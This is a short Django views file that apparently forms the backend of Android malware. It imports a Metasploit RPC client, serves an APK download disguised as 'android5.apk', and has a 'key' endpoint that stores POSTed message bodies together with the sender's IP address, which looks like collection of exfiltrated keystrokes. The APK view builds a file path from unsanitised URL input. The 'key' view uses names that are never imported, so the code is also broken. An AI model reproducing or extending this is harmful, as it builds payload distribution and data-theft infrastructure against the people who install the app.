from django.http import HttpResponse, HttpResponseRedirect
from django.template import loader
from django.urls import reverse
from django.views.decorators.csrf import csrf_protect, csrf_exempt
from django.http import HttpResponse
from django.template import RequestContext
import threading
import os
import requests
import json
from back.models import Messages

from pymetasploit3.msfrpc import MsfRpcClient


def get_apk_file(request, apk_name):
    apk_file = open(f"{apk_name}.apk", "rb")
    response = HttpResponse(apk_file, content_type="application/vnd.android.package-archive")
    response["Content-Disposition"] = 'attachment; filename="android5.apk"'
    return response


def key(request):
    try:
        Messages.objects.create(message=request.POST["body"], ip=request.META["REMOTE_ADDR"])
        return Response("Ok", status=status.HTTP_200_OK)
    except:
        return Response("Error", status=status.HTTP_400_BAD_REQUEST)
